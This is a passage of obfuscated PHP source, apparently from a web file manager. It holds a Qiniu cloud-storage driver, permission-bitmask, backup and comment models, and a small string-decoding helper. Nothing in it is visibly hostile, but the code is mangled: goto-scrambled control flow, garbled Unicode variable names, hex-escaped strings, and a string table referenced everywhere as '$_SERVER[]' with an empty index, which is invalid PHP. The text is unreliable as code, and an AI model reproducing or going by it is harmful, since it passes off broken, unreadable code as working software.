$dؓ[33], 0, 10); } return $e; goto c̓; b: $e[$dؓ[194]] = $e[$dؓ[84]] = 0; $e[$dؓ[195]] = $e[$dؓ[196]] = !0; $dߺǆ = rtrim($dߺǆ, $dؓ[8]) . $dؓ[8]; goto FԌ; aؚ: $dؓ =& $_SERVER[]; $e = array($dؓ[28] => $this->pathThis($dߺǆ), $dؓ[76] => $this->getPathOuter($dؓ[8] . $dߺǆ), $dؓ[29] => $dؓ[77]); if ($A) { return $e; } goto b; c̓: } public function listPath($Cَ, $E = false) { $bƦ =& $_SERVER[]; $Dڇ = $this->fileList($Cَ, $bƦ[8], !0); foreach ($Dڇ[$bƦ[75]] as $Dؚ => $bښ) { $Dڇ[$bƦ[75]][$Dؚ] = $this->folderInfo($bښ, $E); } foreach ($Dڇ[$bƦ[74]] as $Dؚ => $bښ) { $Dڇ[$bƦ[74]][$Dؚ] = $this->fileInfo($bښ[$bƦ[93]], $E, $bښ); } return $Dڇ; } public function has($E, $D = false, $C = true) { goto Bؒ; d˗ǝ: return !1; goto F˲Ş; Bؒ: $b =& $_SERVER[]; $E = trim($E, $b[8]); $C̻ = empty($E) && $E !== $b[191] ? $b[33] : $E . $b[8]; goto Eړҧ; Eړҧ: $Dˣ = $b[33]; $FҞ = 500; $C֖ = $b[8]; goto Fꂥ; Fꂥ: $Cİ = $Dɶ˧ = 0; while (!0) { check_abort(); list($bɂ, $b) = $this->bucketManager->listFiles($this->bucket, $C̻, $Dˣ, $FҞ, $C֖); if ($b) { break; } $Dˣ = array_key_exists($b[1281], $bɂ) ? $Dˣ = $bɂ[$b[1313]] : $b[33]; if ($D) { if (!empty($bɂ[$b[1314]])) { $Cİ += count($bɂ[$b[1314]]); } if (!empty($bɂ[$b[1315]])) { $Dɶ˧ += count($bɂ[$b[1315]]); } if ($Dˣ === $b[33]) { break; } continue; } if ($C) { if (!empty($bɂ[$b[1314]])) { return !0; } } else { if (!empty($bɂ[$b[1315]])) { return !0; } } if ($Dˣ === $b[33]) { break; } } if ($D) { return array($b[203] => $Cİ, $b[204] => $Dɶ˧); } goto d˗ǝ; F˲Ş: } public function listAll($E±ʂ) { $f焋 =& $_SERVER[]; $C = $this->fileList($E±ʂ, $f焋[33], !0); $BЬ = array(); foreach ($C[$f焋[74]] as $D㴮) { $BЬ[$D㴮[$f焋[93]]] = $D㴮[$f焋[78]]; } foreach ($C[$f焋[75]] as $D㴮) { if (is_string($D㴮)) { $BЬ[$D㴮] = 0; } } return $this->listAllFiles($E±ʂ, array_keys($BЬ), $BЬ); } private function fileList($fڅ, $fת = '', $aɱ = 0) { goto D; D: $c =& $_SERVER[]; $fڅ = trim($fڅ, $c[8]); $Bɻ̗ = empty($fڅ) && $fڅ !== $c[191] ? $c[33] : $fڅ . $c[8]; goto aˤ; aˤ: $Dꊋ = $c[33]; $DŌ = 1000; $cք݄ = $this->listItemCache === !1 ? !1 : !0; goto C; C: $fޢ = $C˙ = array(); while (!0) { check_abort(); list($Fڨ, $fڕ) = $this->bucketManager->listFiles($this->bucket, $Bɻ̗, $Dꊋ, $DŌ, $fת); if ($fڕ) { break; } $Dꊋ = array_key_exists($c[1281], $Fڨ) ? $Dꊋ = $Fڨ[$c[1313]] : $c[33]; $E = isset($Fڨ[$c[1314]]) ? $Fڨ[$c[1314]] : array(); $dᴖ = isset($Fڨ[$c[1315]]) ? $Fڨ[$c[1315]] : array(); foreach ($E as $F) { goto c; A: if ($C) { $fޢ[] = $d; continue; } $C˙[] = $aɱ ? $F : $d; goto Eՠ; c: if ($F[$c[93]] == $Bɻ̗) { continue; } $d = $F[$c[93]]; $D = $F[$c[1311]]; goto b듖; b듖: $F[$c[78]] = $D; $C = $D == 0 && substr($d, strlen($d) - 1, 1) == $c[8] ? !0 : !1; if ($cք݄) { $this->cacheMethod($c[199], $d, $C); $this->cacheMethod($c[200], $d, $F); } goto A; Eՠ: } foreach ($dᴖ as $d) { if ($d == $Bɻ̗) { continue; } $fޢ[] = $d; if ($cք݄) { $this->cacheMethod($c[199], $d, !0); } } if ($Dꊋ === $c[33]) { break; } } if ($cք݄) { $this->cacheMethod($c[199], $fڅ, !0); } goto e˨; e˨: return array($c[75] => $fޢ, $c[74] => $C˙); goto d݄; d݄: } public function canRead($eժĎ) { return $this->exist($eժĎ) ? !0 : !1; } public function canWrite($c行) { return $this->exist($c行) ? !0 : !1; } public function getContent($eÄ) { return $this->fileSubstr($eÄ, 0, -1); } public function setContent($aض, $C = '') { $d× = $this->tempFile($this->pathThis($aض)); file_put_contents($d×, $C); if ($this->upload($aض, $d×)) { $this->tempFileRemve($d×); return !0; } return !1; } public function refreshUrls($B) { goto Eޅ⯾; A: $c̔ = new Qiniu\Cdn\CdnManager($this->auth); list($c, $fᝧ) = $c̔->refreshUrls($b); if ($fᝧ) { return !1; } goto AѶ; Eޅ⯾: $D =& $_SERVER[]; $b = array(); if (is_array($B)) { foreach ($B as $e嘪) { $b[] = $this->link($e嘪); } } else { $b[] = $this->link($B); } goto A; AѶ: return $c[$D[1085]] == $D[726] ? !0 : !1; goto Eݷ; Eݷ: } public function fileSubstr($b, $F̲, $Dǧ) { $D =& $_SERVER[]; if (!($bՕ = $this->link($b))) { return !1; } $D = !1; if ($Dǧ > 0) { $Fߎ = $F̲ + $Dǧ - 1; $D = array($D[1316] . $F̲ . $D[440] . $Fߎ); } $dЪՈ߆ = url_request($bՕ, $D[228], !1, $D); return $dЪՈ߆[$D[716]] ? $dЪՈ߆[$D[1095]] : !1; } public function upload($b, $aɓ, $Cܑ = false, $c؃͈ = REPEAT_REPLACE) { $cٗ = new Qiniu\Storage\UploadManager(); $f𿵿 = $this->auth->uploadToken($this->bucket, $b); $e𚡆 = get_file_mime(get_path_ext($aɓ)); list($B, $E蠹) = $cٗ->putFile($f𿵿, $b, $aɓ, null, $e𚡆); return $E蠹 ? !1 : $this->getPathOuter($b); } public function uploadFormData($C, $d׬ = 3600) { return $this->uploadToken($C, $d׬); } public function multiUploadFormData($c, $d棼㥷 = 3600) { return $this->uploadToken($c, $d棼㥷); } private function uploadToken($d, $a = 3600) { goto eӎ; eӎ: $fء =& $_SERVER[]; $f讙 = $a; $DŹ = array($fء[1317] => $fء[1318]); goto Cۻ; c: $Bފ = http_type() . "\x3a\57\x2f\x75\x70\x6c\157\x61\144{$e޲ڿ}\56\161\x69\156\x69\165\x70\56\x63\157\x6d\x2f"; return array($fء[1320] => $f, $fء[1321] => $Bފ); goto Fƕ٤; Cۻ: $BƆ = $d; $f = $this->auth->uploadToken($this->bucket, $BƆ, $f讙, $DŹ, !0); $e޲ڿ = empty($this->region) || $this->region == $fء[1319] ? $fء[33] : $fء[440] . $this->region; goto c; Fƕ٤: } public function download($aΫ, $a􇉯) { goto Eͧ; B寪: fclose($bͻ); return $a􇉯; goto F; Eͧ: $F҇ۑ = IO::getPathInner(IO::mkfile($a􇉯)); if (!($a = $this->link($aΫ))) { return !1; } $Fȶч = 0; goto Bԟ; Bԟ: $D˙ = 1024 * 200; $bͻ = fopen($F҇ۑ, $_SERVER[][1322]); while (!0) { $fى㾦 = $this->fileSubstr($aΫ, $Fȶч, $D˙); if ($fى㾦 === !1) { return !1; } fwrite($bͻ, $fى㾦); $Fȶч += $D˙; if (strlen($fى㾦) < $D˙) { break; } } goto B寪; F: } public function link($E, $d臃 = '') { if (!$this->isFile($E)) { return !1; } $cݾÒ = $this->getHost() . $_SERVER[][8] . $this->pathEncode($E) . $d臃; return $this->auth->privateDownloadUrl($cݾÒ, 3600 * 12); } public function fileOut($c, $cڍ޸ = false, $eĥ = false, $Fך݋ = '') { $C҃ =& $_SERVER[]; if ($this->isFileOutServer()) { return $this->fileOutServer($c, $cڍ޸, $eĥ, $Fך݋); } if (!$eĥ) { $eĥ = $this->pathThis($c); } $e頧 = $cڍ޸ ? $C҃[1323] . rawurlencode($eĥ) : $C҃[33]; $DΉҝ = $this->link($c, $e頧); $this->fileOutLink($DΉҝ); } public function fileOutServer($bێ, $Dݥ܋ = false, $aҏ = false, $b򯌝 = '') { parent::fileOut($bێ, $Dݥ܋, $aҏ, $b򯌝); } public function fileOutImage($Bʎ, $bܐ = 250) { $E񨞗 = $this->link($Bʎ, $_SERVER[][1324] . $bܐ); $this->fileOutLink($E񨞗); } public function fileOutImageServer($eޑ, $FҭΏ = 250) { parent::fileOutImage($eޑ, $FҭΏ); } public function hashMd5($D릜ֵ) { $D =& $_SERVER[]; $c؈֥ = $this->objectMeta($D릜ֵ); return isset($c؈֥[$D[208]]) ? $c؈֥[$D[208]] : !1; $aЉ = $this->link($D릜ֵ, $D[1325]); } public function size($B) { $f = $this->objectMeta($B); return $f ? $f[$_SERVER[][78]] : 0; } public function info($B½څ) { if ($this->isFolder($B½څ)) { return $this->folderInfo($B½څ); } else { if ($this->isFile($B½څ)) { return $this->fileInfo($B½څ); } } return !1; } public function exist($b) { return $this->isFile($b) || $this->isFolder($b); } public function isFile($d綌) { return !$this->isFolder($d綌) && $this->objectMeta($d綌); } public function isFolder($A) { return $this->cacheMethod($_SERVER[][199], $A); } protected function objectMeta($a) { return $this->cacheMethod($_SERVER[][200], $a); } protected function _objectMeta($d) { $Fˍ =& $_SERVER[]; list($d, $EŃ) = $this->bucketManager->stat($this->bucket, $d); if ($d) { $d[$Fˍ[78]] = intval($d[$Fˍ[1311]]); } return $d; } protected function _isFolder($aʏ) { $b̟ =& $_SERVER[]; if ($aʏ == $b̟[33] || $aʏ == $b̟[8]) { return !0; } list($A, $f) = $this->bucketManager->listFiles($this->bucket, trim($aʏ, $b̟[8]) . $b̟[8], $b̟[33], 1, $b̟[8]); return !empty($A[$b̟[1314]]) || !empty($A[$b̟[1315]]) ? !0 : !1; } } goto cſ; f: class AuthModel extends ModelBaseLight { const AUTH_SHOW = 1; const AUTH_VIEW = 2; const AUTH_DOWNLOAD = 4; const AUTH_UPLOAD = 8; const AUTH_EDIT = 16; const AUTH_REMOVE = 32; const AUTH_SHARE = 64; const AUTH_COMMENT = 128; const AUTH_EVENT = 256; const AUTH_ROOT = 33554432; public static function authAll() { return self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT; } public static function authDefault() { $a퍣ӷ =& $_SERVER[]; $d = array(array($a퍣ӷ[413] => LNG($a퍣ӷ[1702]), $a퍣ӷ[1703] => $a퍣ӷ[1704], $a퍣ӷ[1705] => 1, $a퍣ӷ[1706] => 1, $a퍣ӷ[1707] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT), array($a퍣ӷ[413] => LNG($a퍣ӷ[1708]), $a퍣ӷ[1703] => $a퍣ӷ[1709], $a퍣ӷ[1705] => 2, $a퍣ӷ[1706] => 1, $a퍣ӷ[1707] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_COMMENT | self::AUTH_EVENT), array($a퍣ӷ[413] => LNG($a퍣ӷ[1710]), $a퍣ӷ[1703] => $a퍣ӷ[1711], $a퍣ӷ[1705] => 3, $a퍣ӷ[1706] => 1, $a퍣ӷ[1707] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_COMMENT | self::AUTH_EVENT), array($a퍣ӷ[413] => LNG($a퍣ӷ[1712]), $a퍣ӷ[1703] => $a퍣ӷ[1713], $a퍣ӷ[1705] => 4, $a퍣ӷ[1706] => 1, $a퍣ӷ[1707] => self::AUTH_SHOW | self::AUTH_VIEW), array($a퍣ӷ[413] => LNG($a퍣ӷ[1714]), $a퍣ӷ[1703] => $a퍣ӷ[1715], $a퍣ӷ[1705] => 5, $a퍣ӷ[1706] => 1, $a퍣ӷ[1707] => self::AUTH_SHOW | self::AUTH_UPLOAD), array($a퍣ӷ[413] => LNG($a퍣ӷ[1716]), $a퍣ӷ[1703] => $a퍣ӷ[1717], $a퍣ӷ[1705] => 6, $a퍣ӷ[1706] => 1, $a퍣ӷ[1707] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT), array($a퍣ӷ[413] => LNG($a퍣ӷ[1718]), $a퍣ӷ[1703] => $a퍣ӷ[1719], $a퍣ӷ[1705] => 7, $a퍣ӷ[1706] => 1, $a퍣ӷ[1707] => 0)); return $d; } public static function authCheck($C, $Fߑ) { $C = intval($C); if ($GLOBALS[$_SERVER[][485]]) { return !0; } if ($C <= 0) { return !1; } if (($C & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($C & $Fߑ); } public static function authCheckShow($Eɶ) { return self::authCheck($Eɶ, self::AUTH_SHOW); } public static function authCheckView($Dқי) { return self::authCheck($Dқי, self::AUTH_VIEW); } public static function authCheckDownload($D) { return self::authCheck($D, self::AUTH_DOWNLOAD); } public static function authCheckUpload($B) { return self::authCheck($B, self::AUTH_UPLOAD); } public static function authCheckEdit($BԎ) { return self::authCheck($BԎ, self::AUTH_EDIT); } public static function authCheckRemove($D) { return self::authCheck($D, self::AUTH_REMOVE); } public static function authCheckShare($B쑫) { return self::authCheck($B쑫, self::AUTH_SHARE); } public static function authCheckComment($Aކ) { return self::authCheck($Aކ, self::AUTH_COMMENT); } public static function authCheckEvent($Aٿ) { return self::authCheck($Aٿ, self::AUTH_EVENT); } public static function authCheckRoot($b§) { return self::authCheck($b§, self::AUTH_ROOT); } public static function authCheckAction($fي͔, $b) { goto F͕; a̦բ: if (($fي͔ & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($fي͔ & $f); goto c; F͕: $cƳ =& $_SERVER[]; $E־¢ = array($cƳ[1720] => self::AUTH_VIEW, $cƳ[1101] => self::AUTH_DOWNLOAD, $cƳ[107] => self::AUTH_UPLOAD, $cƳ[1668] => self::AUTH_EDIT, $cƳ[1667] => self::AUTH_REMOVE, $cƳ[1678] => self::AUTH_SHARE, $cƳ[352] => self::AUTH_COMMENT, $cƳ[1522] => self::AUTH_EVENT, $cƳ[1721] => self::AUTH_ROOT); if (!isset($E־¢[$b])) { return; } goto eړ; eړ: $f = $E־¢[$b]; $fي͔ = intval($fي͔); if ($fي͔ <= 0) { return !1; } goto a̦բ; c: } public static function authDisable($E惯, $EƋ) { if (intval($E惯) <= 0) { return 0; } return intval($E惯) & ~$EƋ; } public $optionType = "\x53\x79\x73\x74\145\x6d\56\163\157\x75\x72\x63\x65\101\x75\164\x68\x4c\x69\163\164"; public $field = array("\x6e\141\155\x65", "\x61\x75\x74\150", "\154\x61\x62\145\154", "\x64\x69\163\x70\154\x61\171", "\163\x79\x73\164\145\155", "\x73\157\x72\164"); public function initData() { $A = $this->authDefault(); foreach ($A as $e硩) { $this->add($e硩); } } public function listData($a = false, $c֔ = "\x73\157\x72\x74", $Cˏ = false) { return parent::listData($a, $c֔, $Cˏ); } public function update($aܤ, $A) { $E =& $_SERVER[]; $fĦ = parent::listData($aܤ); $bم̕ = $this->findByName($A[$E[28]]); if (!$fĦ || $bم̕ && $bم̕[$E[393]] != $fĦ[$E[393]]) { return !1; } $this->filterAuth($A[$E[406]]); return parent::update($aܤ, $A); } public function remove($bŻƼ) { $DӺȣ = parent::listData($bŻƼ); if (!$DӺȣ || $DӺȣ[$_SERVER[][1178]]) { return !1; } return parent::remove($bŻƼ); } public function add($dظ = array()) { goto c砗; c٘ϊ: $dظ = array_merge($Bɍ, $dظ); $dظ[$AϪ[1724]] = $this->getSort(); $this->filterAuth($dظ[$AϪ[406]]); goto dӺ; dӺ: return parent::insert($dظ); goto CޓΏ; c砗: $AϪ =& $_SERVER[]; if ($this->findByName($dظ[$AϪ[28]])) { return !1; } $Bɍ = array($AϪ[28] => $AϪ[33], $AϪ[406] => 1, $AϪ[1722] => $AϪ[1711], $AϪ[1723] => 1, $AϪ[1178] => 0, $AϪ[1724] => 0); goto c٘ϊ; CޓΏ: } private function getSort() { $EƾЭ =& $_SERVER[]; $a = parent::listData(); $E熜 = array_to_keyvalue($a, $EƾЭ[33], $EƾЭ[1724]); return empty($E熜) ? 0 : max($E熜) + 1; } private function filterAuth(&$E拊) { goto cʊ; cʊ: if (!$E拊) { return; } $CԆ胯 = array(self::AUTH_SHOW, self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT, self::AUTH_REMOVE, self::AUTH_SHARE, self::AUTH_COMMENT, self::AUTH_EVENT, self::AUTH_ROOT); $a = array(); goto e͚炊; e͚炊: foreach ($CԆ胯 as $c) { if ($E拊 & $c) { $a[] = $c; } } if (in_array(self::AUTH_ROOT, $a)) { $E拊 = array_sum($CԆ胯); return; } $d֨ = array(self::AUTH_DOWNLOAD => array(self::AUTH_VIEW), self::AUTH_EDIT => array(self::AUTH_VIEW), self::AUTH_REMOVE => array(self::AUTH_EDIT), self::AUTH_SHARE => array(self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT)); goto bƓƍ; bƓƍ: foreach ($a as $c) { if (isset($d֨[$c])) { $a = array_merge($a, $d֨[$c]); } } $a[] = self::AUTH_SHOW; $E拊 = array_sum(array_unique($a)); goto Eס; Eס: } public function sort($e쬦, $aҗז) { return parent::update($e쬦, $aҗז); } } class BackupModel extends ModelBaseLight { public $optionType = "\123\171\x73\164\145\155\x2e\x62\x61\x63\x6b\165\x70\x4c\x69\163\x74"; public $field = array("\x69\157", "\x6e\x61\x6d\x65", "\163\x74\x61\x74\165\163", "\143\157\156\x74\x65\x6e\x74", "\x6d\141\x6e\165\x61\154", "\x72\x65\x73\x75\154\x74", "\164\151\x6d\145\106\x72\157\x6d", "\164\x69\155\145\x54\157"); public function config() { goto eޝ·; b֋: $b؂ы = is_array($b؂ы) ? $b؂ы : array(); if (!isset($b؂ы[$Cľ[721]])) { $b؂ы[$Cľ[721]] = $Cľ[87]; } unset($b؂ы[$Cľ[1504]]); goto cރއ; cރއ: Action($Cľ[1725])->taskInit(); Model($Cľ[1503])->cacheClear(); $C = $Cľ[1726]; goto A; A: $aǂ = Model($Cľ[1727])->findByKey($Cľ[1522], $C); if (!$aǂ) { $aǂ = array(); } if (isset($aǂ[$Cľ[197]])) { $aǂ[$Cľ[197]] = json_decode($aǂ[$Cľ[197]], !0); } goto Cɦ; eޝ·: $Cľ =& $_SERVER[]; $b؂ы = Model($Cľ[736])->get($Cľ[748]); $b؂ы = json_decode($b؂ы, !0); goto b֋; Cɦ: if (isset($b؂ы[$Cľ[197]])) { $aǂ[$Cľ[197]][$Cľ[1507]] = $b؂ы[$Cľ[197]]; unset($b؂ы[$Cľ[197]]); } return array_merge($aǂ, $b؂ы); goto BǤ̆; BǤ̆: } public function listData($f⑵䤱 = false, $d = "\155\x6f\144\x69\x66\x79\124\151\x6d\x65", $d = false) { return parent::listData($f⑵䤱, $d, !0); } public function lastItem() { $c布 = $this->listData(); return !empty($c布[0]) ? $c布[0] : null; } public function kill($fɄ) { goto fʊ; d: Task::kill($b[747]); Task::kill($b[770]); Task::kill($b[780]); goto B; AШ: return $this->remove($fɄ); goto Aړ; fʊ: $b =& $_SERVER[]; $Eش = $this->listData($fɄ); if (!$Eش || empty($Eش[$b[28]])) { return !0; } goto d; B: $bߩ = $Eش[$b[28]]; $BÒ = TEMP_FILES . $b[744] . $bߩ . $b[8]; IO::remove($BÒ, !1); goto AШ; Aړ: } public function remove($a) { $fύ = $this->listData($a); if (!$fύ) { return !0; } return $this->backupRemove($fύ); } private function backupRemove($d݇ʰ) { parent::remove($d݇ʰ[$_SERVER[][393]]); $a = $this->backupPath($d݇ʰ); IO::remove($a, !1); return !0; } private function backupPath($dĪ찎) { $B =& $_SERVER[]; $bϪ = $dĪ찎[$B[28]]; $Cɵµ = Model($B[736])->get($B[737]); $fޔō = substr(md5($B[738] . $Cɵµ . $bϪ), 0, 8); return "\173\151\x6f\x3a{$dĪ찎[$B[718]]}\x7d\x2f\x64\x61\x74\x61\x62\x61\x73\x65\57\x62\141\143\153\x75\160\x2f" . $bϪ . $B[71] . $fޔō; } public function start() { goto Cよ; Fϕ: $fɠ = new Backup(); $d˶ = $fɠ->db(); if ($d˶) { $d˶ = $fɠ->dbFile(); if ($d˶ && $e֪[$D[721]] == $D[191]) { $d˶ = $fɠ->file(); } } goto cۃ񩠳; cۃ񩠳: Backup::set(array($D[716] => 1, $D[476] => time())); return !0; goto fݷ; eӣѤ: if (!$e֪ || $e֪[$D[1504]] != $D[87]) { return !1; } $cϻ = $this->process(); foreach ($cϻ as $Aѓߕ) { if ($Aѓߕ) { return Task::restart($Aѓߕ[$D[393]]); } } goto Fϕ; Cよ: $D =& $_SERVER[]; if ($GLOBALS[$D[6]][$D[88]][$D[1728]] != $D[87]) { return !0; } $e֪ = $this->config(); goto eӣѤ; fݷ: } public function process() { $b =& $_SERVER[]; return array($b[724] => Task::get($b[747]), $b[728] => Task::get($b[770]), $b[193] => Task::get($b[780])); } public function restore() { $Eƪ =& $_SERVER[]; ActionCall($Eƪ[1025], !0, 1); ActionCall($Eƪ[1025], !0, 0); } } class CommentModel extends ModelBase { protected $tableName = "\x63\x6f\155\155\x65\156\164"; protected $tableMeta = array("\164\x61\x62\154\x65\116\141\x6d\145" => "\x63\157\155\155\145\156\x74\x5f\x6d\145\164\141", "\155\145\x74\141\106\151\145\154\144" => "\143\157\155\x6d\x65\x6e\x74\111\104"); const TYPE_SOURCE = 1; const TYPE_SHARE = 2; const TYPE_USER = 3; const TYPE_GROUP = 4; const TYPE_TOPIC = 5; public static $TYPEALL = array(self::TYPE_SOURCE, self::TYPE_SHARE, self::TYPE_USER, self::TYPE_GROUP, self::TYPE_TOPIC); public function addComment($E뭩) { $Dކ⇊ =& $_SERVER[]; if ($E뭩[$Dކ⇊[1729]]) { $a = $this->where(array($Dކ⇊[1730] => $E뭩[$Dކ⇊[1729]]))->find(); if (!$a || $a[$Dކ⇊[404]] != $E뭩[$Dކ⇊[404]] || $a[$Dކ⇊[484]] != $E뭩[$Dކ⇊[484]]) { return !1; } $this->where(array($Dކ⇊[1730] => $E뭩[$Dކ⇊[1729]]))->setAdd($Dކ⇊[1731], 1); } $E뭩[$Dކ⇊[1732]] = 0; $E뭩[$Dކ⇊[1731]] = 0; $E뭩[$Dކ⇊[716]] = 1; return $this->add($E뭩); } public function commentCount($fǑ堧, $Bֈ) { goto cà; fǃ교: return array_to_keyvalue($D󩋐, $aɍ䅞[484], $aɍ䅞[480]); goto e˅ׯ; cà: $aɍ䅞 =& $_SERVER[]; if (!$fǑ堧) { return array(); } if (is_string($fǑ堧) || is_int($fǑ堧)) { $fǑ堧 = array($fǑ堧); } goto c夋Ҥ; c夋Ҥ: $aѳ = array($aɍ䅞[484], $aɍ䅞[1733] => $aɍ䅞[480]); $BȻ = array($aɍ䅞[484] => array($aɍ䅞[7], $fǑ堧), $aɍ䅞[404] => $Bֈ); $D󩋐 = $this->field($aѳ)->where($BȻ)->group($aɍ䅞[484])->select(); goto fǃ교; e˅ׯ: } public function remove($dؖ) { $b䩌 =& $_SERVER[]; $eӞ˒ = array($b䩌[1730] => $dؖ); $C߯ = $this->where($eӞ˒)->find(); if ($C߯[$b䩌[1729]]) { $this->where(array($b䩌[1730] => $C߯[$b䩌[1729]]))->setAdd($b䩌[1731], -1); } return $this->where($eӞ˒)->delete(); } public function edit($Aǎ, $a) { $D؂ء =& $_SERVER[]; $Bܚ̍ = array($D؂ء[1730] => $Aǎ); return $this->where($Bܚ̍)->save(array($D؂ء[1734] => $a)); } public function prasise($dӰ) { $B =& $_SERVER[]; $Cޞ̆ = Model($B[1735]); $B㏌ = array($B[1730] => $dӰ, $B[1525] => USER_ID); $bȥ = $Cޞ̆->where($B㏌)->find(); if (!$bȥ) { $Cޞ̆->add($B㏌); $f± = $this->where(array($B[1730] => $dӰ))->setAdd($B[1732], 1); } else { $Cޞ̆->where($B㏌)->delete(); $f± = $this->where(array($B[1730] => $dӰ))->setAdd($B[1732], -1); } return $f±; } public function targetInfo($E몫, $b) { goto fޤ܅; Eղ: return $Cأ; goto c; F: $BὍ = "\122\111\x47\x48\x54\x20\x4a\x4f\111\116\40{$this->tablePrefix}\x63\157\155\x6d\x65\x6e\x74\x5f\160\162\141\x69\163\x65\40\x73\164\x61\162\x20\157\156\40\143\157\x6d\155\145\156\x74\56\143\157\x6d\x6d\x65\x6e\164\111\104\x20\75\40\163\x74\x61\162\56\143\157\155\155\x65\x6e\x74\111\x44"; $aڠ = $this->alias($BƝ߹[352])->where($cĎص)->join($BὍ, $BƝ߹[1736])->count(); $Cأ = array($BƝ߹[1737] => $fً, $BƝ߹[1738] => $aڠ); goto Eղ; fޤ܅: $BƝ߹ =& $_SERVER[]; $cĎص = array($BƝ߹[549] => $E몫, $BƝ߹[550] => $b); $fً = $this->where($cĎص)->count(); goto F; c: } public function listData($a𨞄) { $F =& $_SERVER[]; if (isset($a𨞄[$F[1739]])) { if ($a𨞄[$F[1739]]) { $a𨞄[$F[1740]] = array($F[978], intval($a𨞄[$F[1739]])); } unset($a𨞄[$F[1739]]); } if (isset($a𨞄[$F[1741]])) { if ($a𨞄[$F[1741]]) { $a𨞄[$F[1740]] = array($F[975], intval($a𨞄[$F[1741]])); } unset($a𨞄[$F[1741]]); } return $this->_listData($a𨞄); } private function _listData($Aׅ) { $dɘ =& $_SERVER[]; $Eѵ = $this->where($Aׅ)->_makeOrder()->selectPage(100); $this->_listAppendParent($Eѵ[$dɘ[367]]); $this->_listAppendUser($Eѵ[$dɘ[367]]); $this->_listAppendMeta($Eѵ[$dɘ[367]]); return $Eѵ; } private function _makeOrder() { $aμ =& $_SERVER[]; $Cе = array($aμ[1732], $aμ[1731], $aμ[194]); $d⟹ = Input::get($aμ[435], $aμ[7], $aμ[416], $Cе); $e = Input::get($aμ[436], $aμ[7], $aμ[1527], array($aμ[1742], $aμ[431])); $aí = $d⟹ . $aμ[50] . $e; return $this->order($aí); } private function _listAppendParent(&$C׻ڭ) { goto Dǌ; c: foreach ($C׻ڭ as &$FЊ) { if (isset($Aڜ퍢[$FЊ[$Eϲ[1729]]])) { $FЊ[$Eϲ[1743]] = $Aڜ퍢[$FЊ[$Eϲ[1729]]]; } } unset($FЊ); goto bͦ; F詣Ʒ: if (!$C팡̷) { return; } $Aڜ퍢 = $this->where(array($Eϲ[1730] => array($Eϲ[7], $C팡̷)))->select(); $Aڜ퍢 = array_to_keyvalue($Aڜ퍢, $Eϲ[1740]); goto c; Dǌ: $Eϲ =& $_SERVER[]; $C팡̷ = array_unique(array_to_keyvalue($C׻ڭ, $Eϲ[33], $Eϲ[1729])); $C팡̷ = array_remove_value($C팡̷, $Eϲ[191]); goto F詣Ʒ; bͦ: } private function _listAppendUser(&$CӸӟч) { goto b㌕; Aޑ: foreach ($CӸӟч as &$f) { $f[$aċ[562]] = $c[$f[$aċ[1533]]]; if (isset($f[$aċ[1743]])) { $f[$aċ[1743]][$aċ[562]] = $c[$f[$aċ[1743]][$aċ[1533]]]; } } unset($f); goto B̫; b㌕: $aċ =& $_SERVER[]; $B·܆ = array_unique(array_to_keyvalue($CӸӟч, $aċ[33], $aċ[1533])); $B·܆ = array_remove_value($B·܆, $aċ[191]); goto Aې; Aې: if (count($B·܆) == 0) { return; } foreach ($CӸӟч as $f) { if (isset($f[$aċ[1743]])) { $B·܆[] = $f[$aċ[1743]][$aċ[1533]]; } } $c = Model($aċ[506])->userListInfo($B·܆); goto Aޑ; B̫: } private function _listAppendMeta(&$Fϸ) { goto A; A: $D޺ =& $_SERVER[]; $dȍ = array_unique(array_to_keyvalue($Fϸ, $D޺[33], $D޺[1740])); $dȍ = array_remove_value($dȍ, $D޺[191]); goto e; Eͯ: if (!$c) { return !1; } foreach ($Fϸ as &$e) { $e[$D޺[445]] = $c[$e[$D޺[1740]]]; if (isset($e[$D޺[1743]])) { $e[$D޺[1743]][$D޺[445]] = $c[$e[$D޺[1743]][$D޺[1740]]]; } } unset($e); goto cǩ; e: if (!$dȍ) { return; } foreach ($Fϸ as $e) { if (isset($e[$D޺[1743]])) { $dȍ[] = $e[$D޺[1743]][$D޺[1740]]; } } $c = $this->metaList($dȍ); goto Eͯ; cǩ: } private function metaList($c֍Ȳ) { goto Cͩ; e䛸: return $eǌ ? $eǌ : array(); goto eؿ; Eע: $eǌ = Model($e[1744])->where($E)->select(); $eǌ = array_to_keyvalue_group($eǌ, $e[1740]); foreach ($eǌ as $e¨ => $dℑգ) { $a = array(); foreach ($dℑգ as $c) { $a[$c[$e[93]]] = $c[$e[372]]; } $eǌ[$e¨] = $a; } goto e䛸; Cͩ: $e =& $_SERVER[]; if (!$c֍Ȳ) { return array(); } $E = array($e[1740] => array($e[7], $c֍Ȳ)); goto Eע; eؿ: } } goto f߄ϔ; bЬ: if (!function_exists('_kodDe')) { function _kodDe($aؿŏ) { $aؿŏ = base64_decode($aؿŏ); $F׫܎ = strlen($aؿŏ); $DŪ = ''; $dˤ = ord($aؿŏ[0]) - 30; for ($F׺ = 1; $F׺ < $F׫܎; $F׺ += 2) { if ($F׺ + 1 < $F׫܎) { $DŪ .= chr(ord($aؿŏ[$F׺ + 1]) + $dˤ); $DŪ .= chr(ord($aؿŏ[$F׺]) + $dˤ); } else { $DŪ .= chr(ord($aؿŏ[$F׺]) + $dˤ); } } return $DŪ; } } 